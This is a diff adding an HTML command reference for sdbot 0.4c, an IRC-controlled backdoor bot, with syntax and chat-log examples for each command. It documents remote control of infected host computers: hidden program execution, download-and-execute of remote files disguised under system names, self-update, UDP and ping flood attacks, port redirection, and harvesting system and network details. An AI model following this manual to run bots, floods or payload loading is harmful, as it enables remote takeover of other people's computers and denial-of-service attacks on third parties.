@@ -1,0 +1,713 @@
+<html>
+
+<head>
+<meta http-equiv="Content-Language" content="en-us">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<meta name="GENERATOR" content="Microsoft FrontPage 4.0">
+<meta name="ProgId" content="FrontPage.Editor.Document">
+<title>sdbot command reference</title>
+</head>
+
+<body bgcolor="#000000" text="#CCCCCC" link="#FF9933" vlink="#FF9933" alink="#FF9933">
+
+<p align="center"><font face="Arial Black" size="4" color="#808080"><img border="0" src="sdbot.jpg" width="240" height="60"><br>
+  </font><font face="Arial Black" size="5" color="#CCCCCC">command reference</font></p>
+<p align="center"><a name="top"></a></p>
+<p align="center"><a href="#general">general</a> / <a href="#clonesspies">clones &amp; 
+  spies</a> / <a href="#download">downloading</a> / <a href="#udpping">udp/ping</a> 
+  / <a href="#redirect">redirect</a> 
+  / <a href="#sysinfo">system info</a></p>
+<table border="1" width="100%" bordercolorlight="#333333" bordercolordark="#333333" bordercolor="#333333">
+  <tr> 
+    <td width="11%" bordercolor="#000000" bordercolorlight="#000000" bordercolordark="#000000" align="center" bgcolor="#666666"><b><font face="Arial" size="2" color="#FFFFFF">command</font></b></td>
+    <td width="6%" bordercolor="#000000" bordercolorlight="#000000" bordercolordark="#000000" align="center" bgcolor="#666666"><b><font face="Arial" size="2" color="#FFFFFF">alias</font></b></td>
+    <td width="19%" bordercolor="#000000" bordercolorlight="#000000" bordercolordark="#000000" align="center" bgcolor="#666666"><b><font face="Arial" size="2" color="#FFFFFF">syntax</font></b></td>
+    <td width="30%" bordercolor="#000000" bordercolorlight="#000000" bordercolordark="#000000" align="center" bgcolor="#666666"><b><font face="Arial" size="2" color="#FFFFFF">description</font></b></td>
+    <td width="34%" bordercolor="#000000" bordercolorlight="#000000" bordercolordark="#000000" align="center" bgcolor="#666666"><b><font face="Arial" size="2" color="#FFFFFF">example</font></b></td>
+  </tr>
+  <tr> 
+    <td width="11%" bordercolor="#000000" bordercolorlight="#000000" bordercolordark="#000000" align="center" bgcolor="#333333"><b><font face="Arial" size="2" color="#FFFFFF">general
+      commands</font></b></td>
+    <td width="6%" bordercolor="#000000" bordercolorlight="#000000" bordercolordark="#000000" align="center" bgcolor="#000000"><a name="general"></a>&nbsp;</td>
+    <td width="19%" bordercolor="#000000" bordercolorlight="#000000" bordercolordark="#000000" align="center" bgcolor="#000000">&nbsp;</td>
+    <td width="30%" bordercolor="#000000" bordercolorlight="#000000" bordercolordark="#000000" align="center" bgcolor="#000000">&nbsp;</td>
+    <td width="34%" bordercolor="#000000" bordercolorlight="#000000" bordercolordark="#000000" align="center" bgcolor="#000000">
+      <div align="right"><a href="#top">top</a></div>
+    </td>
+  </tr>
+  <tr> 
+    <td width="11%" align="center">about</td>
+    <td width="6%" align="center">ab</td>
+    <td width="19%" align="center">about</td>
+    <td width="30%" align="left">causes 
+      the bot to blatently advertise itself</td>
+    <td width="34%" align="left"> 
+      <p>&lt;Faust&gt; .about<br>
+        &lt;sdbot&gt; sdbot version 0.4c by [sd] (sdbot@mail.ru). homepage: http://sdbot.n3.net/</p>
+    </td>
+  </tr>
+  <tr>
+    <td width="11%" align="center">action</td>
+    <td width="6%" align="center">a</td>
+    <td width="19%" align="center">action<br>
+      &lt;channel/user&gt; &lt;text&gt;</td>
+    <td width="30%" align="left">causes 
+      the bot to perform the specified action (kind of like / me) to the specified 
+      channel or user.</td>
+    <td width="34%" align="left">&lt;[sd]&gt; 
+      .action #idlechat explodes.<br>
+      * sdbot explodes.</td>
+  </tr>
+  <tr> 
+    <td width="11%" align="center">addalias</td>
+    <td width="6%" align="center">aa</td>
+    <td width="19%" align="center">addalias 
+      &lt;alias name&gt; &lt;command&gt;</td>
+    <td width="30%" align="left">temporarily 
+      adds an alias to the bot's alias list. you can use any of the following 
+      variables in your alias: $me (bot's nick), $chan (current channel), $user
+      (user executing the command),&nbsp; $rndnick (4-7
+      character random string), $1 through $16 (1st parameter through 16th), $1-
+      through $15- (first parameter and everything after it, etc.) </td>
+    <td width="34%" align="left">&lt;Faust&gt; 
+      .addalias hello privmsg $chan hello<br>
+      &lt;Faust&gt; .hello<br>
+      &lt;sdbot&gt; hello<br>
+      &lt;[sd]&gt; .addalias smackme action $chan smacks $user $1-<br>
+      &lt;[sd]&gt; .smackme 2 times<br>
+      * sdbot smacks [sd] 2 times.</td>
+  </tr>
+  <tr> 
+    <td width="11%" align="center">aliases</td>
+    <td width="6%" align="center">al</td>
+    <td width="19%" align="center">aliases</td>
+    <td width="30%" align="left">causes 
+      the bot to reply with it's current alias list.</td>
+    <td width="34%" align="left">&lt;Faust&gt; 
+      .aliases<br>
+      &lt;sdbot&gt; -[alias list]-<br>
+      &lt;sdbot&gt; 0. opme = mode $chan +o $user<br>
+      &lt;sdbot&gt; 1. smack = action $chan smacks $1<br>
+      &lt;sdbot&gt; 2. u1 = udp $1 10000 2048 50<br>
+      &lt;sdbot&gt; 3. u2 = udp $1 10000 $2 50<br>
+      &lt;sdbot&gt; 4. halfop = mode $chan +h $1</td>
+  </tr>
+  <tr> 
+    <td width="11%" align="center">cycle</td>
+    <td width="6%" align="center">cy</td>
+    <td width="19%" align="center">cycle 
+      &lt;seconds&gt; &lt;channel&gt;</td>
+    <td width="30%" align="left">causes 
+      the bot to leave the specified channel, then come back after the number 
+      of seconds specified.</td>
+    <td width="34%" align="left">&lt;[sd]&gt; 
+      .cycle 5 #idlechat<br>
+      * sdbot has left the channel.<br>
+      &nbsp;[5 seconds later...]<br>
+      * sdbot has joined the channel.</td>
+  </tr>
+  <tr> 
+    <td width="11%" align="center">die</td>
+    <td width="6%" align="center">d</td>
+    <td width="19%" align="center">die</td>
+    <td width="30%" align="left">causes 
+      the bot to immediately close on the host's computer. this will also kill all threads, 
+      so be careful. try to use 'quit' if possible instead of die, because die
+      performs no cleanup.</td>
+    <td width="34%" align="left">&lt;[sd]&gt; 
+      .die<br>
+      * sdbot has quit (connection reset by peer).</td>
+  </tr>
+  <tr>
+    <td width="11%" align="center">disconnect</td>
+    <td width="6%" align="center">dc</td>
+    <td width="19%" align="center">disconnect</td>
+    <td width="30%" align="left">causes 
+      the bot to disconnect from the server, but stay running, then reconnect 30
+      mins later. no threads are killed.</td>
+    <td width="34%" align="left">&lt;[sd]&gt; 
+      .disconnect<br>
+      * sdbot has quit (later.).</td>
+  </tr>
+  <tr> 
+    <td width="11%" align="center">dns</td>
+    <td width="6%" align="center">dn</td>
+    <td width="19%" align="center">dns</td>
+    <td width="30%" align="left">causes 
+      the bot to resolve a hostname into an ip address.</td>
+    <td width="34%" align="left">&lt;[sd]> .dns www.google.com<br>
+      &lt;sdbot&gt; 216.239.33.101</td>
+  </tr>
+  <tr> 
+    <td width="11%" align="center">execute</td>
+    <td width="6%" align="center">e</td>
+    <td width="19%" align="center">execute 
+      &lt;visibility&gt; &lt;file&gt; [parameters] </td>
+    <td width="30%" align="left">causes 
+      the bot to run a program. visibility should be 0 or 1, being hidden or
+      visible respectively.</td>
+    <td width="34%" align="left">&lt;Faust&gt; 
+      .execute 1 notepad.exe<br>
+      [notepad runs visibly] </td>
+  </tr>
+  <tr> 
+    <td width="11%" align="center">id</td>
+    <td width="6%" align="center">i</td>
+    <td width="19%" align="center">id</td>
+    <td width="30%" align="left">causes 
+      the bot to reply with its id.</td>
+    <td width="34%" align="left">&lt;[sd]&gt; 
+      .id<br>
+      &lt;sdbot&gt; sdbot1</td>
+  </tr>
+  <tr> 
+    <td width="11%" align="center">join</td>
+    <td width="6%" align="center">j</td>
+    <td width="19%" align="center">join 
+      &lt;channel&gt; [key] </td>
+    <td width="30%" align="left">causes 
+      the bot to join the specified channel on the current server (using the
+      key(password), if specified.</td>
+    <td width="34%" align="left"> 
+      &lt;[sd]&gt; .join #idlechat<br>
+      &nbsp;[in #idlechat...]<br>
+      * sdbot has joined the channel.</td>
+  </tr>
+  <tr> 
+    <td width="11%" align="center">killthread</td>
+    <td width="6%" align="center">k</td>
+    <td width="19%" align="center">killthread 
+      &lt;thread #&gt; [thread #] [...] </td>
+    <td width="30%" align="left">causes 
+      the bot to kill the specified thread(s) (this command will not work on thread 
+      0, use 'die' instead).</td>
+    <td width="34%" align="left">&lt;[sd]&gt;
+      .killthread 4<br>
+      &lt;sdbot&gt; thread(s) killed.<br>
+      &lt;[sd]&gt; .killthread 2 3<br>
+      &lt;sdbot&gt; thread(s) killed.</td>
+  </tr>
+  <tr> 
+    <td width="11%" align="center">log</td>
+    <td width="6%" align="center">lg</td>
+    <td width="19%" align="center">log</td>
+    <td width="30%" align="left">causes 
+      the bot to reply with a log of connections and logins, along with dates 
+      and times.</td>
+    <td width="34%" align="left">&lt;[sd]&gt; 
+      .log<br>
+      &lt;sdbot&gt; [Sat Sep 22 11:58:12 2001] user [sd](user@host.net) logged 
+      in.<br>
+      &lt;sdbot&gt; [Sat Sep 22 11:57:54 2001] connected to irc.lcirc.net.<br>
+      &lt;sdbot&gt; [Sat Sep 22 11:57:53 2001] bot started.</td>
+  </tr>
+  <tr> 
+    <td width="11%" align="center">login</td>
+    <td width="6%" align="center">l</td>
+    <td width="19%" align="center">login 
+      &lt;password&gt; </td>
+    <td width="30%" align="left">logs<br>
+      you into the bot if the specified password is correct. once you log in,<br>
+      you must log out with the 'logout' command if you want someone else to log<br>
+      in (unless you have multiple logins enabled). if you are kicked or part from the channel,
+      or quit you<br>
+      are automatically logged out.</td>
+    <td width="34%" align="left">&lt;[sd]&gt; 
+      .login hehe<br>
+      &lt;sdbot&gt; password accepted.</td>
+  </tr>
+  <tr> 
+    <td width="11%" align="center">logout</td>
+    <td width="6%" align="center">lo</td>
+    <td width="19%" align="center">logout</td>
+    <td width="30%" align="left">manually 
+      logs you out of the bot.</td>
+    <td width="34%" align="left">&lt;[sd]&gt; 
+      .logout<br>
+      &lt;sdbot&gt; user [sd] logged out.</td>
+  </tr>
+  <tr> 
+    <td width="11%" align="center">mode</td>
+    <td width="6%" align="center">m</td>
+    <td width="19%" align="center">mode 
+      [channel] &lt;mode&gt; [user]</td>
+    <td width="30%" align="left">causes 
+      the bot to set a channel or user mode (works like the /mode command).</td>
+    <td width="34%" align="left">&lt;[sd]&gt; 
+      .mode #sdbot +o [sd]<br>
+      &nbsp;[in #sdbot...]<br>
+      * sdbot sets mode +o [sd].</td>
+  </tr>
+  <tr> 
+    <td width="11%" align="center">nick</td>
+    <td width="6%" align="center">n</td>
+    <td width="19%" align="center">nick 
+      &lt;new nick&gt; </td>
+    <td width="30%" align="left">causes 
+      the bot to change its nick to the one specified.</td>
+    <td width="34%" align="left">&lt;[sd]&gt; 
+      .nick sdbot2<br>
+      * sdbot is now known as sdbot2.</td>
+  </tr>
+  <tr> 
+    <td width="11%" align="center">open</td>
+    <td width="6%" align="center">o</td>
+    <td width="19%" align="center">open
+      &lt;file&gt; </td>
+    <td width="30%" align="left">caueses
+      the bot to open a file. unlike execute, this command will open any kind of
+      file, not just programs. you can also use this to open a web page in the
+      computer's default browser.</td>
+    <td width="34%" align="left">&lt;[sd]&gt;
+      .open c:\windows\clouds.bmp<br>
+      &lt;sdbot&gt; file opened.</td>
+  </tr>
+  <tr> 
+    <td width="11%" align="center">part</td>
+    <td width="6%" align="center">pt</td>
+    <td width="19%" align="center">part 
+      &lt;channel&gt; </td>
+    <td width="30%" align="left">causes 
+      the bot to part the specified channel on the current server</td>
+    <td width="34%" align="left">&lt;[sd]&gt; 
+      .part #sdbot<br>
+      &nbsp;[in #sdbot...]<br>
+      * sdbot has left the channel.</td>
+  </tr>
+  <tr> 
+    <td width="11%" align="center">prefix</td>
+    <td width="6%" align="center">pf</td>
+    <td width="19%" align="center">prefix 
+      &lt;prefix&gt; </td>
+    <td width="30%" align="left">temporarily 
+      changes the bot's command prefix. the prefix will be reset the next time 
+      the bot is run.</td>
+    <td width="34%" align="left"> 
+      <p>&lt;Faust&gt; .prefix !<br>
+        &lt;Faust&gt; !s<br>
+      &lt;sdbot&gt; sdbot 0.4b ready. Up 0d 1h 31m.<br>
+      &nbsp;<br>
+      </p>
+    </td>
+  </tr>
+  <tr> 
+    <td width="11%" align="center">privmsg</td>
+    <td width="6%" align="center">pm</td>
+    <td width="19%" align="center">privmsg 
+      &lt;nick/channel&gt; &lt;message&gt;</td>
+    <td width="30%" align="left">causes 
+      the bot to message the user/channel<br>
+      with the specified text.</td>
+    <td width="34%" align="left"> 
+      <p>&lt;Faust&gt; .privmsg Faust hello<br>
+        [in private query]<br>
+      &lt;sdbot&gt; hello</p>
+      <p>&lt;[sd]&gt; .privmsg #sdbot hello<br>
+        [in #sdbot]<br>
+        &lt;sdbot&gt; hello <br>
+      </p>
+    </td>
+  </tr>
+  <tr> 
+    <td width="11%" align="center">quit</td>
+    <td width="6%" align="center">q</td>
+    <td width="19%" align="center">quit
+      [message]</td>
+    <td width="30%" align="left">causes 
+      the bot to quit the current server (with the specified message, if any).
+      this command will also close the bot and kill all threads, so be careful.</td>
+    <td width="34%" align="left">&lt;[sd]&gt; 
+      .quit<br>
+      * sdbot has quit (goodbye.).</td>
+  </tr>
+  <tr> 
+    <td width="11%" align="center">raw</td>
+    <td width="6%" align="center">r</td>
+    <td width="19%" align="center">raw 
+      &lt;text&gt; </td>
+    <td width="30%" align="left">causes 
+      the bot to send the specified text to the server.</td>
+    <td width="34%" align="left">&lt;[sd]&gt; 
+      .raw QUIT :later!<br>
+      * sdbot has quit (later!)</td>
+  </tr>
+  <tr> 
+    <td width="11%" align="center">reconnect</td>
+    <td width="6%" align="center">r</td>
+    <td width="19%" align="center">reconnect</td>
+    <td width="30%" align="left">causes 
+      the bot to disconnect from the current server, then reconnect. the bot will 
+      receive a new nick and ident.</td>
+    <td width="34%" align="left">&lt;[sd]&gt; 
+      .reconnect<br>
+      * sdbot has quit (connection reset by peer).<br>
+      * kdsfa has joined the channel.</td>
+  </tr>
+  <tr> 
+    <td width="11%" align="center">remove</td>
+    <td width="6%" align="center">rm</td>
+    <td width="19%" align="center">remove</td>
+    <td width="30%" align="left">causes 
+      the bot to totally remove itself from the host computer (including
+      autostart).</td>
+    <td width="34%" align="left">&lt;Faust&gt; 
+      .remove<br>
+      &lt;sdbot&gt; removing bot...<br>
+      * sdbot has quit (Connection reset by peer)</td>
+  </tr>
+  <tr> 
+    <td width="11%" align="center">repeat</td>
+    <td width="6%" align="center">rp</td>
+    <td width="19%" align="center">repeat 
+      &lt;# of times&gt; &lt;command&gt;</td>
+    <td width="30%" align="left">causes 
+      the bot to act as if it had received the specified command from you the number of
+      times given.</td>
+    <td width="34%" align="left">&lt;[sd]&gt; 
+      .repeat 3 .privmsg #sdbot hehe<br>
+      &lt;sdbot&gt; hehe<br>
+      &lt;sdbot&gt; hehe<br>
+      &lt;sdbot&gt; hehe</td>
+  </tr>
+  <tr> 
+    <td width="11%" align="center">rndnick</td>
+    <td width="6%" align="center">rn</td>
+    <td width="19%" align="center">rndnick</td>
+    <td width="30%" align="left">causes<br>
+      the bot to change to a random nick.</td>
+    <td width="34%" align="left">&lt;[sd]&gt; 
+      .rndnick<br>
+      * sdbot is now known as dhjds.</td>
+  </tr>
+  <tr> 
+    <td width="11%" align="center">server</td>
+    <td width="6%" align="center">se</td>
+    <td width="19%" align="center">server</td>
+    <td width="30%" align="left">temporarily
+      changes the server that the bot connects to.</td>
+    <td width="34%" align="left">&lt;[sd]&gt;
+      .server irc.prison.net<br>
+      &lt;[sd]&gt; .reconnect<br>
+      [bot connects to irc.prison.net]</td>
+  </tr>
+  <tr>
+    <td width="11%" align="center">status</td>
+    <td width="6%" align="center">s</td>
+    <td width="19%" align="center">status</td>
+    <td width="30%" align="left">causes 
+      the bot to echo back its version number, and how long the bot has been running.</td>
+    <td width="34%" align="left">&lt;[sd]&gt; 
+      .status<br>
+      &lt;sdbot&gt; sdbot 0.4c ready. Up 0d 4h 31m.</td>
+  </tr>
+  <tr> 
+    <td width="11%" align="center">threads</td>
+    <td width="6%" align="center">t</td>
+    <td width="19%" align="center">threads</td>
+    <td width="30%" align="left">causes 
+      the bot to reply with a list of running threads. threads will keep 
+      their original number, even if other threads close or are killed.</td>
+    <td width="34%" align="left">&lt;[sd]&gt; 
+      .threads<br>
+      &lt;sdbot&gt; -[thread list]-<br>
+      &lt;sdbot&gt; 0. main thread<br>
+      &lt;sdbot&gt; 1. udp (192.168.0.1)<br>
+      &lt;sdbot&gt; 2. redirect (12345- &gt;irc.lcirc.net:6667)<br>
+      &lt;sdbot&gt; 3. spy (irc.dal.net)</td>
+  </tr>
+  <tr> 
+    <td width="11%" bordercolor="#000000" bordercolorlight="#000000" bordercolordark="#000000" align="center" bgcolor="#333333"><b><font face="Arial" size="2" color="#FFFFFF">clones/spies</font></b></td>
+    <td width="6%" bordercolor="#000000" bordercolorlight="#000000" bordercolordark="#000000" align="center" bgcolor="#000000"><a name="clonesspies"></a>&nbsp;</td>
+    <td width="19%" bordercolor="#000000" bordercolorlight="#000000" bordercolordark="#000000" align="center" bgcolor="#000000">&nbsp;</td>
+    <td width="30%" bordercolor="#000000" bordercolorlight="#000000" bordercolordark="#000000" align="center" bgcolor="#000000">&nbsp;</td>
+    <td width="34%" bordercolor="#000000" bordercolorlight="#000000" bordercolordark="#000000" align="center" bgcolor="#000000">
+      <div align="right"><a href="#top">top</a></div>
+    </td>
+  </tr>
+  <tr> 
+    <td width="11%" align="center">c_action</td>
+    <td width="6%" align="center">c_a</td>
+    <td width="19%" align="center">c_action 
+      &lt;thread #&gt; &lt;channel/user&gt; &lt;text&gt;</td>
+    <td width="30%" align="left">causes 
+      the clone/spy with the specified thread number to perform an action (like 
+      /me) to the specified channel or user.</td>
+    <td width="34%" align="left">&lt;[sd]&gt; 
+      .c_action 2 explodes.<br>
+      * clone explodes.</td>
+  </tr>
+  <tr> 
+    <td width="11%" align="center">c_join</td>
+    <td width="6%" align="center">c_j</td>
+    <td width="19%" align="center">c_join 
+      &lt;thread #&gt; &lt;channel&gt; [key]</td>
+    <td width="30%" align="left">causes 
+      the clone/spy with the specified thread number to join a channel.</td>
+    <td width="34%" align="left">&lt;[sd]&gt; 
+      .c_join 3 #idlechat<br>
+      &nbsp;[in #idlechat...]<br>
+      * clone2 has joined the channel.</td>
+  </tr>
+  <tr> 
+    <td width="11%" align="center">c_mode</td>
+    <td width="6%" align="center">c_m</td>
+    <td width="19%" align="center">c_mode 
+      &lt;thread #&gt; [channel] &lt;mode&gt; [user]</td>
+    <td width="30%" align="left">causes 
+      the clone/spy with the specified thread number to set a channel or user 
+      mode (works like the /mode command).</td>
+    <td width="34%" align="left">&lt;[sd]&gt; 
+      .c_mode 2 #sdbot +o [sd]<br>
+      &nbsp;[in #sdbot...]<br>
+      * clone sets mode +o [sd].</td>
+  </tr>
+  <tr> 
+    <td width="11%" align="center">c_nick</td>
+    <td width="6%" align="center">c_n</td>
+    <td width="19%" align="center">c_nick 
+      &lt;thread #&gt; &lt;nick&gt;</td>
+    <td width="30%" align="left">causes 
+      the clone/spy with the specified thread number to change its nick.</td>
+    <td width="34%" align="left">&lt;[sd]&gt; 
+      .c_nick 2 clone3<br>
+      * clone is now know as clone3.</td>
+  </tr>
+  <tr> 
+    <td width="11%" align="center">c_part</td>
+    <td width="6%" align="center">c_p</td>
+    <td width="19%" align="center">c_join 
+      &lt;thread #&gt; &lt;channel&gt;</td>
+    <td width="30%" align="left">causes 
+      the clone/spy with the specified thread number to part a channel.</td>
+    <td width="34%" align="left">&lt;[sd]&gt; 
+      .c_part 3 #idlechat<br>
+      &nbsp;[in #idlechat...]<br>
+      * clone2 has left the channel.</td>
+  </tr>
+  <tr> 
+    <td width="11%" align="center">c_privmsg<br>
+    </td>
+    <td width="6%" align="center">c_pm</td>
+    <td width="19%" align="center">c_privmsg<br>
+      &lt;thread #&gt; &lt;channel/user&gt; &lt;text&gt;</td>
+    <td width="30%" align="left">causes 
+      the clone/spy with the specified thread number to message the user/channel 
+      with the specified text.</td>
+    <td width="34%" align="left">&lt;[sd]&gt; 
+      .c_privmsg 2 #sdbot hey!<br>
+      &nbsp;[in #sdbot...]<br>
+      &lt;clone&gt; hey!</td>
+  </tr>
+  <tr> 
+    <td width="11%" align="center">c_quit</td>
+    <td width="6%" align="center">c_q</td>
+    <td width="19%" align="center">c_quit 
+      &lt;thread #&gt;</td>
+    <td width="30%" align="left">causes 
+      the clone/spy with the specified thread number to quit its irc server.</td>
+    <td width="34%" align="left">&lt;[sd]&gt; 
+      .c_quit 2<br>
+      * clone has quit (later.).</td>
+  </tr>
+  <tr> 
+    <td width="11%" align="center">c_raw</td>
+    <td width="6%" align="center">c_r</td>
+    <td width="19%" align="center">c_raw 
+      &lt;thread #&gt; &lt;text&gt;</td>
+    <td width="30%" align="left">causes 
+      the clone/spy with the specified thread number to send the specified text<br>
+      to the server.</td>
+    <td width="34%" align="left">&lt;[sd]&gt;
+      .c_raw 2 QUIT :later!<br>
+      * clone2 has quit (later!)</td>
+  </tr>
+  <tr>
+    <td width="11%" align="center">c_rndnick</td>
+    <td width="6%" align="center">c_rn</td>
+    <td width="19%" align="center">c_rndnick
+      &lt;thread #&gt;</td>
+    <td width="30%" align="left">causes 
+      the clone/spy with the specified thread number to change to a random
+      nickname.</td>
+    <td width="34%" align="left">&lt;[sd]&gt;
+      .c_rndnick 3<br>
+      * clone2 is now known as sagklj.</td>
+  </tr>
+  <tr> 
+    <td width="11%" align="center">clone</td>
+    <td width="6%" align="center">c</td>
+    <td width="19%" align="center">clone 
+      &lt;server&gt; &lt;port&gt; &lt;channel&gt;</td>
+    <td width="30%" align="left">causes 
+      the bot to create a clone on the specified server, on the specified port<br>
+      in the specified channel.</td>
+    <td width="34%" align="left">&lt;[sd]&gt; 
+      .clone irc.lcirc.net 6667 #sdbot<br>
+      &lt;sdbot&gt; clone created on irc.lcirc.net:6667 in channel #sdbot</td>
+  </tr>
+  <tr> 
+    <td width="11%" align="center">spy</td>
+    <td width="6%" align="center">sp</td>
+    <td width="19%" align="center">spy 
+      &lt;nick&gt; &lt;server&gt; &lt;port&gt; &lt;channel&gt;</td>
+    <td width="30%" align="left">creates 
+      a spy with the specified nick on the specified server/port, in the<br>
+      specified channel.</td>
+    <td width="34%" align="left">&lt;[sd]&gt;
+      .spy spy1 irc.dal.net 6667 #sdbot<br>
+      &lt;sdbot&gt; spy created on irc.dal.net:6667, in channel #sdbot.<br>
+      &lt;sdbot&gt; [#sdbot]: spy1 has joined #sdbot.</td>
+  </tr>
+  <tr> 
+    <td width="11%" bordercolor="#000000" bordercolorlight="#000000" bordercolordark="#000000" align="center" bgcolor="#333333"><b><font face="Arial" size="2" color="#FFFFFF">download</font></b></td>
+    <td width="6%" bordercolor="#000000" bordercolorlight="#000000" bordercolordark="#000000" align="center" bgcolor="#000000"><a name="download"></a>&nbsp;</td>
+    <td width="19%" bordercolor="#000000" bordercolorlight="#000000" bordercolordark="#000000" align="center" bgcolor="#000000">&nbsp;</td>
+    <td width="30%" bordercolor="#000000" bordercolorlight="#000000" bordercolordark="#000000" align="center" bgcolor="#000000">&nbsp;</td>
+    <td width="34%" bordercolor="#000000" bordercolorlight="#000000" bordercolordark="#000000" align="center" bgcolor="#000000">
+      <div align="right"><a href="#top">top</a></div>
+    </td>
+  </tr>
+  <tr> 
+    <td width="11%" align="center">download</td>
+    <td width="6%" align="center">dl</td>
+    <td width="19%" align="center">download 
+      &lt;url&gt; &lt;destination&gt; &lt;action&gt;</td>
+    <td width="30%" align="left">causes 
+      the bot to download the file specified by url to the file specified by<br>
+      destination. if action is 1, then the file is also executed, otherwise it 
+      is only saved.</td>
+    <td width="34%" align="left">&lt;[sd]&gt; 
+      .download http:// www.host.net/file.exe c:\windows\devldr32.exe 1<br>
+      &lt;sdbot&gt; downloading http:// www.host.net/file.exe...<br>
+      &lt;sdbot&gt; downloaded 79.3 kb to c:\windows\devldr32.exe @ 5.5 kb/sec.<br>
+      &lt;sdbot&gt; executed c:\windows\devldr32.exe.</td>
+  </tr>
+  <tr> 
+    <td width="11%" align="center">update</td>
+    <td width="6%" align="center">up</td>
+    <td width="19%" align="center">update 
+      &lt;url&gt; &lt;id&gt;</td>
+    <td width="30%" align="left">causes 
+      the bot to download the file specified by url, and replace the current sdbot 
+      executable with the new one if the bot id specified by id is different than 
+      the bot's id.</td>
+    <td width="34%" align="left">&lt;[sd]&gt; 
+      .update http:// www.host.net/sdbot.exe sdbot2<br>
+      &lt;sdbot&gt; downloading update from http://www.host.net/ sdbot.exe...<br>
+      &lt;sdbot&gt; downloaded 9.2 kb to c:\sdbot.exe @ 9.2 kb/sec. updating...</td>
+  </tr>
+  <tr> 
+    <td width="11%" bordercolor="#000000" bordercolorlight="#000000" bordercolordark="#000000" align="center" bgcolor="#333333"><b><font face="Arial" size="2" color="#FFFFFF">udp/ping</font></b></td>
+    <td width="6%" bordercolor="#000000" bordercolorlight="#000000" bordercolordark="#000000" align="center" bgcolor="#000000"><a name="udpping"></a>&nbsp;</td>
+    <td width="19%" bordercolor="#000000" bordercolorlight="#000000" bordercolordark="#000000" align="center" bgcolor="#000000">&nbsp;</td>
+    <td width="30%" bordercolor="#000000" bordercolorlight="#000000" bordercolordark="#000000" align="center" bgcolor="#000000">&nbsp;</td>
+    <td width="34%" bordercolor="#000000" bordercolorlight="#000000" bordercolordark="#000000" align="center" bgcolor="#000000">
+      <div align="right"><a href="#top">top</a></div>
+    </td>
+  </tr>
+  <tr> 
+    <td width="11%" align="center">udp</td>
+    <td width="6%" align="center">u</td>
+    <td width="19%" align="center">udp 
+      &lt;host&gt; &lt;# of packets&gt; &lt;packet size&gt; &lt;delay&gt; [port]</td>
+    <td width="30%" align="left">causes 
+      the bot to send the specified number of udp packets of the specified size 
+      to the host, with the number of milliseconds specified by delay between packets.
+      if port is specified, it sends the udp packets to that port. otherwise, it
+      uses a random port.</td>
+    <td width="34%" align="left">&lt;[sd]&gt; 
+      .udp 127.0.0.1 1000 4096 100<br>
+      &lt;sdbot&gt; sending 1000 udp packets to: 127.0.0.1. packet size: 4096, 
+      delay: 100[ms].</td>
+  </tr>
+  <tr> 
+    <td width="11%" align="center">ping</td>
+    <td width="6%" align="center">p</td>
+    <td width="19%" align="center">ping 
+      &lt;host&gt; &lt;# of pings&gt; &lt;packet size&gt; &lt;timeout&gt;</td>
+    <td width="30%" align="left">causes 
+      the bot to send the specified number of pings to the host, and wait the 
+      number of milliseconds specified by timeout for packets to return before sending the next
+      set.</td>
+    <td width="34%" align="left">&lt;[sd]&gt; 
+      .ping 127.0.0.1 1000 4096 100<br>
+      &lt;sdbot&gt; sending 1000 pings to 127.0.0.1. packet size: 4096, timeout: 
+      100[ms]</td>
+  </tr>
+  <tr> 
+    <td width="11%" bordercolor="#000000" bordercolorlight="#000000" bordercolordark="#000000" align="center" bgcolor="#333333"><b><font face="Arial" size="2" color="#FFFFFF">redirect</font></b></td>
+    <td width="6%" bordercolor="#000000" bordercolorlight="#000000" bordercolordark="#000000" align="center" bgcolor="#000000"><a name="redirect"></a>&nbsp;</td>
+    <td width="19%" bordercolor="#000000" bordercolorlight="#000000" bordercolordark="#000000" align="center" bgcolor="#000000">&nbsp;</td>
+    <td width="30%" bordercolor="#000000" bordercolorlight="#000000" bordercolordark="#000000" align="center" bgcolor="#000000">&nbsp;</td>
+    <td width="34%" bordercolor="#000000" bordercolorlight="#000000" bordercolordark="#000000" align="center" bgcolor="#000000">
+      <div align="right"><a href="#top">top</a></div>
+    </td>
+  </tr>
+  <tr> 
+    <td width="11%" align="center">redirect</td>
+    <td width="6%" align="center">rd</td>
+    <td width="19%" align="center">redirect 
+      &lt;local port&gt; &lt;remote host&gt; &lt;remote port&gt;</td>
+    <td width="30%" align="left">causes 
+      the bot to start a basic port redirect. everything sent to the port<br>
+      specified by local port will be redirected to the remote host and port specified.</td>
+    <td width="34%" align="left">&lt;[sd]&gt; 
+      .redirect 12345 irc.lcirc.net 6667<br>
+      &lt;sdbot&gt; redirect created on port 12345 to irc.lcirc.net:6667.</td>
+  </tr>
+  <tr> 
+    <td width="11%" bordercolor="#000000" bordercolorlight="#000000" bordercolordark="#000000" align="center" bgcolor="#333333"><b><font face="Arial" size="2" color="#FFFFFF">system
+      info</font></b></td>
+    <td width="6%" bordercolor="#000000" bordercolorlight="#000000" bordercolordark="#000000" align="center" bgcolor="#000000"><a name="sysinfo"></a>&nbsp;</td>
+    <td width="19%" bordercolor="#000000" bordercolorlight="#000000" bordercolordark="#000000" align="center" bgcolor="#000000">&nbsp;</td>
+    <td width="30%" bordercolor="#000000" bordercolorlight="#000000" bordercolordark="#000000" align="center" bgcolor="#000000">&nbsp;</td>
+    <td width="34%" bordercolor="#000000" bordercolorlight="#000000" bordercolordark="#000000" align="center" bgcolor="#000000">
+      <div align="right"><a href="#top">top</a></div>
+    </td>
+  </tr>
+  <tr>
+    <td width="11%" align="center">sysinfo</td>
+    <td width="6%" align="center">si</td>
+    <td width="19%" align="center">sysinfo</td>
+    <td width="30%" align="left">causes 
+      the bot to reply with information on the host system, including processor 
+      speed, total/free ram, operating system version, and uptime.</td>
+    <td width="34%" align="left">&lt;[sd]&gt;
+      .sysinfo<br>
+        &lt;sdbot&gt; cpu: 1400MHz. ram: 523744KB total, 376108KB free. os: Windows
+      XP (5.1, build 2600). uptime: 4d 3h 11m.</td>
+  </tr>
+  <tr> 
+    <td width="11%" align="center">netinfo</td>
+    <td width="6%" align="center">ni</td>
+    <td width="19%" align="center">netinfo</td>
+    <td width="30%" align="left">causes 
+      the bot to reply with information on the bot's network connection,
+      including connection type/name, local IP address, and host used to connect
+      the the irc server.</td>
+    <td width="34%" align="left">&lt;[sd]&gt;
+      .netinfo<br>
+        &lt;sdbot&gt; connection type: dial-up (MSN).
